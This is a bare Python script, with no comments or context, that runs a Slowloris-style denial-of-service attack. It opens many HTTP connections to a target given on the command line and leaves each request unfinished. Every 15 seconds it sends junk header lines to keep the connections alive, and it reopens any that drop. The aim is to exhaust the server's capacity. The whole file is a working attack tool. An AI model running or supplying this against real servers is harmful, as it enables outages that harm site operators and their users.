import socket
import random
import time
import sys

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]


def create_socket():
    c_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c_socket.settimeout(4)
    c_socket.connect((sys.argv[1], 80))
    c_socket.send(f"GET /?{random.randint(0, 255)} HTTP/1.1\r\n".encode("utf-8"))

    for header in headers:
        c_socket.send(f"{header}\r\n".encode("utf-8"))
    return c_socket


if __name__ == "__main__":
    sockets = []
    for _ in range(int(sys.argv[2])):
        try:
            new_socket = create_socket()
        except socket.error:
            break
        sockets.append(new_socket)

    while True:
        print(f"{len(sockets)} sockets connected")
        for o_socket in list(sockets):
            try:
                o_socket.send(f"X-a: {random.randint(1, 255)}\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(o_socket)

        lost = int(sys.argv[2]) - len(sockets)
        for _ in range(lost):
            print(f'{lost} sockets died. Reopening.')
            try:
                new_socket = create_socket()
                sockets.append(new_socket)
            except socket.error:
                break

        time.sleep(15)
